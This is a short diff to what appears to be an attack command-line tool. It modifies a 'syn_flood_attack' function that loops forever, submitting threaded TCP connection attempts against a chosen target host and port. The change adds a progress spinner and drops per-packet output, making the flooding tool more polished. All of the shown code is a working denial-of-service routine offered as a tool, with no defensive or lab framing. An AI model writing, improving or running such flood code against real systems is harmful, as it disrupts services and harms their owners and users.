@@ -4,10 +4,10 @@ import typer
 
 from attackcli.utils.thread_exec import ThreadedExecutor
 
+from rich.progress import Progress, SpinnerColumn, TextColumn
 
 def _syn_once(target: str, port: int):
     try:
-        typer.echo(typer.style(f"Sending SYN packet {target}:{port}", fg=typer.colors.BRIGHT_BLACK))
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(0.5)
         sock.connect((target, port))
@@ -21,7 +21,14 @@ def syn_flood_attack(target: str, port: int, workers: int) -> None:
     executor = ThreadedExecutor(max_workers=workers)
     executor.start()
     try:
-        while True:
-            executor.submit(_syn_once, target, port)
+        with Progress(
+                SpinnerColumn(),
+                transient=True,
+        ) as progress:
+            task = progress.add_task("[cyan]Sending packets...", start=False)
+            progress.start_task(task)
+            while True:
+                executor.submit(_syn_once, target, port)
+                progress.update(task)
     except KeyboardInterrupt:
         executor.wait()
